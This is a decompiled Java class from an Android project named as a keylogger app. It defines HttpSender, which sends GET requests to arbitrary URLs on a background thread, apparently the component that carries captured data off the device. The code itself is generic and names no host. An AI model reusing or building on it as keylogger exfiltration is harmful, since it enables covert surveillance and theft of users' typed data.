package com.example.keyloggerapp;

import android.util.Log;

import java.io.IOException;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class HttpSender {
    public static void sendGetRequest(String url) {
        Log.d("check",url);
        try {
            final OkHttpClient client = new OkHttpClient();
            final Request request = new Request.Builder().url(url).build();
            new Thread(new Runnable() { // from class: com.example.keyloggerprj.HttpSender$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    HttpSender.lambda$sendGetRequest$0(client, request);
                }
            }).start();
        } catch (Exception e) {
        }
    }

    static /* synthetic */ void lambda$sendGetRequest$0(OkHttpClient client, Request request) {
        try {
            Response response = client.newCall(request).execute();
            try {
                if (response.isSuccessful()) {
                    String responseData = response.body().string();
                    System.out.println(responseData);
                } else {
                    System.out.println("Request failed");
                }
                if (response != null) {
                    response.close();
                }
            } finally {
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
